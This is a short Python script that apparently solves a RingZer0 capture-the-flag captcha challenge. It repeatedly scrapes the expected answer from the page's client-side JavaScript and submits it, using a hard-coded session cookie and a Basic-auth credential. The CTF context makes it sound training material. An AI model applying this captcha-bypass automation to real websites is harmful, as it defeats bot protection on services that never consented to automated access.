import requests
cookie = {'_ga':'GA1.2.1373385590.1498799275','_gid':'GA1.2.867459789.1498799275','_gat':'1','PHPSESSID':'1kr76vh1164sbgeflnngimi321'}
url = 'http://captcha.ringzer0team.com:7421'
headers = {'Authorization':'Basic Y2FwdGNoYTpRSmM5VTZ3eEQ0U0ZUMHU='}
for i in range(1000):
	 # get captacha
	 r = requests.get("http://captcha.ringzer0team.com:7421/form1.php",cookies=cookie,headers=headers)
	 start_addr = r.text.find('if (A == "') + len('if (A == "')
	 end_addr = r.text.find('"',start_addr)
	 captcha = r.text[start_addr:end_addr]
	 print(i,":",captcha)
	 k = requests.get("http://captcha.ringzer0team.com:7421/captcha/captchabroken.php?new",cookies=cookie,headers=headers)
	 data = {'captcha': captcha}
	 k = requests.post('http://captcha.ringzer0team.com:7421/captcha1.php',cookies=cookie,headers=headers,data=data)
